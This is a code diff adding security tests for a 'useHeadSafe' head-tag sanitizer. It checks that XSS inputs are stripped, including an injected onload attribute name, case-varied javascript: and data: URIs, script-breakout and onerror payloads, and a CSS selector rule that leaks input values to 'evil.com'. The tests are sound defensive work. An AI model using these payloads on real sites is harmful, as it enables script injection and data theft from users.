@@ -77,6 +77,163 @@ describe('dom useHeadSafe', () => {
     `)
   })
 
+  it('blocks XSS via data-* attribute name injection', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      link: [{
+        'rel': 'stylesheet',
+        'href': '/valid-stylesheet.css',
+        'data-x onload=alert(1) y': 'z',
+      }],
+    })
+
+    const ctx = await renderSSRHead(head)
+    // The injected attribute key with spaces should be stripped
+    expect(ctx.headTags).not.toContain('onload')
+    expect(ctx.headTags).toContain('rel="stylesheet"')
+    expect(ctx.headTags).toContain('href="/valid-stylesheet.css"')
+  })
+
+  it('blocks case-varied javascript: and data: URIs in link href', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      link: [
+        { rel: 'stylesheet', href: 'DATA:text/css,body{display:none}' },
+        { rel: 'stylesheet', href: 'JAVASCRIPT:alert(1)' },
+        { rel: 'stylesheet', href: 'Javascript:alert(1)' },
+        { rel: 'stylesheet', href: 'Data:text/css,*{color:red}' },
+      ],
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).toBe('')
+  })
+
+  it('strips noscript textContent to prevent HTML injection', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      noscript: [{
+        textContent: '<img src=x onerror=alert(1)>',
+      }],
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).toBe('')
+  })
+
+  it('sanitizes script textContent through JSON parse/stringify', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      script: [{
+        type: 'application/ld+json',
+        textContent: '{"@type": "Organization", "name": "Test"}',
+      }],
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).toContain('application/ld+json')
+    expect(ctx.headTags).toContain('"@type":"Organization"')
+  })
+
+  it('blocks dangerous URIs in imagesrcset', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      link: [
+        { rel: 'icon', href: '/ok.png', imagesrcset: 'data:image/svg+xml,<svg onload=alert(1)>' },
+      ],
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).not.toContain('data:')
+  })
+
+  it('title renders safely', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      title: 'My Safe Page',
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).toContain('<title>My Safe Page</title>')
+  })
+
+  it('title strips event handler props', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      title: 'My Page',
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).not.toContain('onload')
+    expect(ctx.headTags).toContain('<title>My Page</title>')
+  })
+
+  it('blocks style textContent (CSS injection)', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      style: [{
+        textContent: 'body{display:none}input[value^="a"]{background:url(https://evil.com/a)}',
+      }],
+    })
+
+    const ctx = await renderSSRHead(head)
+    // style textContent should be stripped in safe mode
+    expect(ctx.headTags).not.toContain('display:none')
+    expect(ctx.headTags).not.toContain('evil.com')
+  })
+
+  it('blocks style innerHTML (CSS injection)', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      style: [{
+        // @ts-expect-error intentionally invalid
+        'innerHTML': 'body { background: url("javascript:alert(1)") }',
+        'data-foo': 'bar',
+      }],
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).not.toContain('javascript')
+    expect(ctx.headTags).not.toContain('background')
+  })
+
+  it('blocks script with invalid JSON textContent', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      script: [{
+        type: 'application/ld+json',
+        textContent: '</script><script>alert(1)</script>',
+      }],
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).toBe('')
+  })
+
+  it('blocks script with non-json type', async () => {
+    const head = createServerHeadWithContext()
+
+    useHeadSafe(head, {
+      script: [{
+        type: 'text/javascript',
+        textContent: 'alert(1)',
+      }],
+    })
+
+    const ctx = await renderSSRHead(head)
+    expect(ctx.headTags).toBe('')
+  })
+
   it('meta charset is actually safe', async () => {
     const head = createServerHeadWithContext()
 
